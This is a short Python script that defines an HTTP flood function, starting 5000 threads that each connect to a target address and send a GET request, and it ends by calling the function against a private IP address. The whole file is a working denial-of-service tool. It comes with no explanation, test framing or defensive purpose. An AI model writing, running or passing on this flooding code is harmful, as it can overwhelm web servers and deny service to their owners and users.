import threading
import socket

def http_flood(target_ip, target_port=80, count=5000):
    def send_request():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\nConnection: keep-alive\r\n\r\n")
            s.close()
        except:
            pass

    threads = [threading.Thread(target=send_request) for _ in range(count)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

http_flood("192.168.100.3")
